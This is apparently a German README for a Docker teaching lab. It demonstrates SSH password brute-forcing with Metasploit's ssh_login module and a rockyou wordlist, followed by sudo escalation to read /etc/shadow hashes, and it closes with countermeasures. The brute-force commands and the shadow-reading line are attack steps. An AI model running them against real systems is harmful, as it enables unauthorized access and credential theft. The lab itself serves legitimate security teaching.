# Szenario 3: SSH Brute-Force (schwache Passwoerter)

Live-Demo: Der Angreifer findet einen offenen SSH-Server, **erraet per Brute-Force schwache
Passwoerter**, loggt sich ein und eskaliert ueber `sudo` zu **root** — alles aus Metasploit heraus.

## Hintergrund

Der dritte klassische Einfallsweg (nach CVE-Exploit in Szenario 1 und Trojaner in Szenario 2):
**schwache oder wiederverwendete Zugangsdaten**. Kein Exploit, keine Malware — der Angreifer
probiert einfach systematisch Benutzernamen + Passwoerter durch, bis einer passt. Genau dafuer
bringt Metasploit das Modul `auxiliary/scanner/ssh/ssh_login` mit, das bei einem Treffer direkt
eine Shell-Session oeffnet.

## Architektur

```
┌──────────────────┐                          ┌──────────────────┐
│    attacker       │   1. Brute-Force          │     victim        │
│  10.30.0.10       │      ssh_login            │  10.30.0.20       │
│  Metasploit       │  ─── User+Pass-Listen ──▶ │  OpenSSH-Server   │
│  + /wordlists     │                           │                   │
│                   │   2. Treffer:             │  Accounts:        │
│  Shell-Session    │ ◀─── admin:password1 ─────│   admin  (sudo)   │
│  → sudo → root    │       mitarbeiter:hallo123│   mitarbeiter     │
└──────────────────┘                          └──────────────────┘
                Docker-Netz: lab (10.30.0.0/24)
```

## Voraussetzungen

- Docker + Docker Compose
- ca. 2 GB freier Speicher (Metasploit-Image)
- Internetverbindung beim ersten Start (Image-Download)

## Start

```sh
cd szenario-3-ssh-bruteforce
docker compose up -d --build     # Container bauen & starten
docker attach ssh-attacker       # an msfconsole anhaengen
```

> **Tipp:** `Ctrl-P Ctrl-Q` loest die Konsole ab, ohne sie zu beenden.

## Demo-Ablauf (Copy-Paste-ready)

### Schritt 1: Reconnaissance — offenen SSH-Port finden

```
nmap -sV 10.30.0.20
```

**Erwartet:** Port `22/tcp open ssh OpenSSH`.

---

### Schritt 2: Wortliste besorgen

Wie im echten Pentest nutzen wir die **rockyou.txt** (14,3 Mio. geleakte Passwoerter). Sie wird
**nicht** mitgeliefert (~133 MB) — einmalig holen:

```sh
./wordlists/get-rockyou.sh      # laedt rockyou.txt nach wordlists/ (oder nimmt Kalis lokale Kopie)
```

> **Schnelle Alternative ohne rockyou:** Es liegt eine winzige Demo-Liste
> [wordlists/passwords.txt](wordlists/passwords.txt) bei. Dann ueberspringst du Schritt 2 und
> ersetzt in Schritt 3 die Optionen durch:
> ```
> set USER_FILE /wordlists/users.txt
> set PASS_FILE /wordlists/passwords.txt
> set STOP_ON_SUCCESS false
> ```
> Das probiert mehrere User durch und findet in ~1 Min **beide** Accounts (`admin` + `mitarbeiter`).

---

### Schritt 3: Brute-Force vorbereiten & starten

```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.30.0.20
set USERNAME admin
set PASS_FILE /wordlists/rockyou.txt
set STOP_ON_SUCCESS true
set VERBOSE true
run
```

**Was passiert:**
- `ssh_login` probiert die rockyou-Passwoerter **von oben nach unten** gegen den User `admin`
- `STOP_ON_SUCCESS true` = stoppt beim ersten Treffer (sonst liefe es ewig weiter)
- `VERBOSE true` = man sieht jeden Versuch live (das viele rote `[-] Failed:` gehoert dazu)

**Erwartet:**
```
[-] 10.30.0.20:22 - Failed: 'admin:123456'
[-] 10.30.0.20:22 - Failed: 'admin:password'
...
[+] 10.30.0.20:22 - Success: 'admin:password1'
[*] SSH session 1 opened ...
```

> **Warum funktioniert das so schnell?** `admin` hat mit `password1` ein **sehr** haeufiges
> Passwort (rockyou-Zeile 28) → in ~1–2 Minuten gefunden. **Wichtige Lektion:** Live-SSH ist
> langsam (jeder Fehlversuch ~2–3 s). Ein Passwort weit hinten in rockyou (z. B. `hallo123`,
> Zeile 26054) wuerde online **Stunden** dauern — sowas knackt man **offline** gegen die
> geklauten Hashes (siehe Schritt 5) mit `hashcat`/`john`. Genau deshalb ist das Abgreifen von
> `/etc/shadow` der eigentliche Jackpot.

Gefundene Zugangsdaten anzeigen:

```
creds
```

Offene Sessions anzeigen:

```
sessions -l
```

---

### Schritt 4: Zugriff nutzen

In die Session des `admin` wechseln (Session-ID aus `sessions -l`):

```
sessions -i 1
```

Jetzt sind wir auf dem Opfer-Rechner:

```
id
hostname
ls -la /home
```

`Ctrl-Z` (bzw. `background`) bringt zurueck in die msfconsole.

---

### Schritt 5: Privilege Escalation — von admin zu root

Der `admin` ist in der `sudo`-Gruppe, und sein Passwort kennen wir bereits. Damit lesen wir die
Passwort-Hashes **aller** User aus `/etc/shadow`:

```
echo 'password1' | sudo -S cat /etc/shadow
```

**Was passiert:** Ein einziges schwaches Passwort gibt uns ueber `sudo` **vollen Root-Zugriff**.
Die Hashes aus `/etc/shadow` koennte der Angreifer anschliessend offline knacken (z. B. mit
John the Ripper / hashcat).

## Stop

```sh
docker compose down -v
```

## Kernaussagen fuer die Praesentation

1. **Kein Exploit noetig** — schwache Passwoerter sind die offene Tuer.
2. **Brute-Force ist billig & automatisiert** — Metasploit probiert in Sekunden hunderte Kombis.
3. **Ein Account genuegt** — ueber `sudo` wird aus einem Login schnell Root.
4. **Gegenmassnahmen:** starke, einzigartige Passwoerter, **SSH-Key-Auth statt Passwort**,
   `fail2ban`/Rate-Limiting, MFA, Account-Lockout, kein direkter Root-Login, Passwort-Policy.

## Hinweise

- Die schwachen Accounts (`admin:password1`, `mitarbeiter:hallo123`) sind im
  [victim/Dockerfile](victim/Dockerfile) bewusst angelegt; die Wortlisten liegen unter
  [wordlists/](wordlists/).
- Szenario 3 nutzt ein eigenes Subnetz (`10.30.0.0/24`) und kollidiert daher nicht mit
  Szenario 1 (`10.10.0.0/24`) oder 2 (`10.20.0.0/24`).
- `rockyou.txt` wird **nicht** eingecheckt (~133 MB, siehe [.gitignore](.gitignore)) — per
  [wordlists/get-rockyou.sh](wordlists/get-rockyou.sh) holen. Die kleine
  [wordlists/passwords.txt](wordlists/passwords.txt) liegt als schnelle Alternative bei.
- Gegen Live-SSH probiert man rockyou nur **von oben** (haeufigste zuerst); tiefe Passwoerter
  knackt man offline gegen die `/etc/shadow`-Hashes mit `hashcat`/`john` — nicht online.
